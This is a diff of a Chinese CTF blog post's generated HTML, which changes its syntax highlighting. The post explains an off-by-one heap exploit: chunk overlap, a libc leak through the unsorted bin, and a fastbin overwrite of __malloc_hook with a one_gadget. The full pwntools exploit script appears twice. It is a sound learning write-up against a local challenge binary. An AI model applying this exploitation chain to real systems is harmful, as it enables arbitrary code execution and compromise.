@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="xman夏令营 off_by_one​    一道off_by_one的题，做了一天，题目有些地方还是有点骚的，最近感触很深，许多题目你知道漏洞点在哪里，利用手法也清楚，但是写exp的时候会遇到很多奇怪的情况就是达不到你想要的效果或者是不能getshell，由此我觉得一个洞，你知道洞在哪怎么利用，和你真正能写exp弹shell之间差别还是有的，前者考察的你对漏洞和glibc内存管理模式的熟悉，后者">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -320,9 +320,72 @@
 <p>拿到题目扔ida一看发现居然开了pie，然后看new函数，是个正常的new，用户输入想要malloc的大小，程序进行malloc，接着看delete函数，free掉指针后将chunk list置0，没啥问题，最后看下edit，发现了问题，edit中对chunk进行修改用的是通过strlen当前chunk，得到当前chunk中存储的字符串长度，再进行重新读入相同大小的数据。这里就有问题了，如果strlen的特性是读到null才停，而如果前一个chunk用户数据域全部被使用，则strlen会将下一个chunk的prev_size域也算进去，这样edit时将会多处一个字节的空间给用户输入。<br>​    找到漏洞在哪儿后开始结合程序的保护手段进行分析利用方式，首先你需要泄露libc基址，如何泄露，想想刚才找到的洞，发现如果只能对next chunk的prev_size进行一个字节的写入，好像很难进行构造，而如果能利用chunk对齐的特性，使前一个chunk复用后一个chunk的prev_size域，这样的话如果能写入一个字节就能对next chunk的size域进行改写了。改写size域后可以通过伪造chunk和更改其对应的元数据域进行overlap，让前一个chunk包含后一个chunk，如果前一个前一个chunk是再unsorted bin中，那么修改其size域的元数据使其包含后一个chunk，此时再malloc一个和前一个chunk相同大小的chunk，这样glibc的分配器由于在其它bin中找不到恰好合适的chunk会将unsorted bin切一块下来，而剩下的部分继续保存在unsorted bin中，同时在chunk list中，还有一个ptr指向那块被包含的chunk，如果堆快大小是精心构造过的，那么可以让chunk list中的那个之前被包含chunk的ptr指向切剩下来的unsorted bin中的free chunk。 </p>
 <p>​    这样就产生了野指针，而且由于被包含的chunk是unsorted bin中的唯一元素，所以可以顺理成章的泄露main_arena+88的地址，之后就能得到libc基地址和其它一些地址了。那之后该如何去做，现在我们有libc地址，和一个可以进任意改写的free chunk，既然chunk元数据域可以任意写，那能否使用通过伪造chunk进行unlink，显然是比较难的，因为虽然chunk list在bss段，但是代码段的载入基址未知，所以想直接写bss段肯定是非常难的，或者有什么其它骚思路可以写其它区域，可能利用起来也比较麻烦，而且要是知道text段载入基址的话，就能直接构造unlink泄露got表地址，然后写got表了，连main_arena都不用泄露，没开pie的话倒是可以unlink。<br>​    可是问题是这道题目是开了pie的，所以unlink没戏。<br>想了一下如果构造的时候被包含的chunk大小属于fastbin，那么进行一次malloc+free后就能得到一个fastbin中的chunk，由于可以任意修改chunk的数据域，那么修改fd为<strong>malloc_hook，刚才已经说了因为开启pie所以不好写got。之后house of spirit，写</strong>malloc_hook为one_gadget，就能getshell了。<br>另外需要注意的是不能直接写fd为malloc_hook地址，这里会把fd指向的chunk的size域和fastbins中对应bin的大小做对比，同时会把add chunk时输入的大小和fd指向的chunk的size做对比，这里fd如果指向<strong>malloc_hook-0x13的话，则size区域最后两个字节为0x7f，这里由于是在fastbin中，大小的话只看前一个字节，后一个字节只看后三位状态位，所以之前构造的被包含的chunk大小一定要是0x70字节大小(allocated chunk状态下)。还有因为这题free hook周边没有满足检查条件的数据(全是null)，所以这里用的是</strong>malloc_hook，其实__free_hook也是可以用的。</p>
 <p>exp如下：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./offbyone'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">def <span class="keyword">add</span>(x):</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'length: '</span>)</span><br><span class="line">	p.sendline(str(len(x)))</span><br><span class="line">	p.recvuntil(<span class="string">'your note:\n'</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line">def edit(idx,x):</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'your note:\n'</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def <span class="keyword">show</span>(idx):</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">add</span>(<span class="number">0x28</span>*<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">add</span>(<span class="number">0xf8</span>*<span class="string">'b'</span>)</span><br><span class="line"><span class="keyword">add</span>(<span class="number">0x68</span>*<span class="string">'c'</span>)</span><br><span class="line"><span class="keyword">add</span>(<span class="number">0x60</span>*<span class="string">'d'</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x28</span>*<span class="string">'a'</span>+<span class="string">'\x71'</span>+<span class="string">'\x01'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x60</span>*<span class="string">'c'</span>+p64(<span class="number">0x170</span>)+<span class="string">'\x70'</span>)</span><br><span class="line"><span class="keyword">add</span>(<span class="number">0xf8</span>*<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">show</span>(<span class="number">2</span>)</span><br><span class="line">main_arena_88=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">info</span>(<span class="string">'main_arena+88 &gt; '</span>+hex(main_arena_88))</span><br><span class="line">libc_base=main_arena_88<span class="number">-0x3c4b78</span></span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">info</span>(<span class="string">'libc_base &gt; '</span>+hex(libc_base))</span><br><span class="line">malloc_hook=libc_base+<span class="number">0x3c4b10</span></span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">info</span>(<span class="string">'malloc_hook &gt; '</span>+hex(malloc_hook))</span><br><span class="line">free_hook=libc_base+<span class="number">0x3c67a8</span></span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">info</span>(<span class="string">'free_hook &gt; '</span>+hex(free_hook))</span><br><span class="line"><span class="meta">#edit(2,p64(malloc_hook)+p64(malloc_hook))</span></span><br><span class="line"><span class="keyword">add</span>(<span class="number">0x68</span>*<span class="string">'a'</span>)</span><br><span class="line">one_gadget=<span class="number">0x45216</span>+libc_base</span><br><span class="line">one_gadget=<span class="number">0x4526a</span>+libc_base</span><br><span class="line">one_gadget=<span class="number">0xf02a4</span>+libc_base</span><br><span class="line"><span class="meta">#one_gadget=0xf1147+libc_base</span></span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">info</span>(<span class="string">'one_gadget &gt; '</span>+hex(one_gadget))</span><br><span class="line">dele(<span class="number">3</span>) </span><br><span class="line">dele(<span class="number">2</span>) #chunk[<span class="number">2</span>] <span class="keyword">move</span> <span class="keyword">from</span> unsorted bin -&gt; fastbins</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">edit(4,p64(free_hook-0x13)[0:6])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">edit(<span class="number">4</span>,p64(malloc_hook<span class="number">-0x13</span>)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"><span class="keyword">add</span>(<span class="number">0x68</span>*<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">add</span>(<span class="number">3</span>*<span class="string">'0'</span>+p64(one_gadget)+<span class="string">'\n'</span>*<span class="number">85</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>from pwn import *
+p=process(&#39;./offbyone&#39;)
+gdb.attach(p)
+def add(x):
+    p.recvuntil(&#39;&gt;&gt; &#39;)
+    p.sendline(&#39;1&#39;)
+    p.recvuntil(&#39;length: &#39;)
+    p.sendline(str(len(x)))
+    p.recvuntil(&#39;your note:\n&#39;)
+    p.sendline(x)
 
+def edit(idx,x):
+    p.recvuntil(&#39;&gt;&gt; &#39;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;index: &#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;your note:\n&#39;)
+    p.sendline(x)
 
+def dele(idx):
+    p.recvuntil(&#39;&gt;&gt; &#39;)
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&#39;index: &#39;)
+    p.sendline(str(idx))
+
+def show(idx):
+    p.recvuntil(&#39;&gt;&gt; &#39;)
+    p.sendline(&#39;4&#39;)
+    p.recvuntil(&#39;index: &#39;)
+    p.sendline(str(idx))
+
+add(0x28*&#39;a&#39;)
+add(0xf8*&#39;b&#39;)
+add(0x68*&#39;c&#39;)
+add(0x60*&#39;d&#39;)
+dele(1)
+edit(0,0x28*&#39;a&#39;+&#39;\x71&#39;+&#39;\x01&#39;)
+edit(2,0x60*&#39;c&#39;+p64(0x170)+&#39;\x70&#39;)
+add(0xf8*&#39;0&#39;)
+show(2)
+main_arena_88=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+log.info(&#39;main_arena+88 &gt; &#39;+hex(main_arena_88))
+libc_base=main_arena_88-0x3c4b78
+log.info(&#39;libc_base &gt; &#39;+hex(libc_base))
+malloc_hook=libc_base+0x3c4b10
+log.info(&#39;malloc_hook &gt; &#39;+hex(malloc_hook))
+free_hook=libc_base+0x3c67a8
+log.info(&#39;free_hook &gt; &#39;+hex(free_hook))
+#edit(2,p64(malloc_hook)+p64(malloc_hook))
+add(0x68*&#39;a&#39;)
+one_gadget=0x45216+libc_base
+one_gadget=0x4526a+libc_base
+one_gadget=0xf02a4+libc_base
+#one_gadget=0xf1147+libc_base
+log.info(&#39;one_gadget &gt; &#39;+hex(one_gadget))
+dele(3) 
+dele(2) #chunk[2] move from unsorted bin -&gt; fastbins
+&#39;&#39;&#39;
+edit(4,p64(free_hook-0x13)[0:6])
+&#39;&#39;&#39;
+edit(4,p64(malloc_hook-0x13)[0:6])
+add(0x68*&#39;a&#39;)
+add(3*&#39;0&#39;+p64(one_gadget)+&#39;\n&#39;*85)
+dele(3)
+p.interactive()
+</code></pre>
     </div>
 
     
@@ -427,6 +490,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
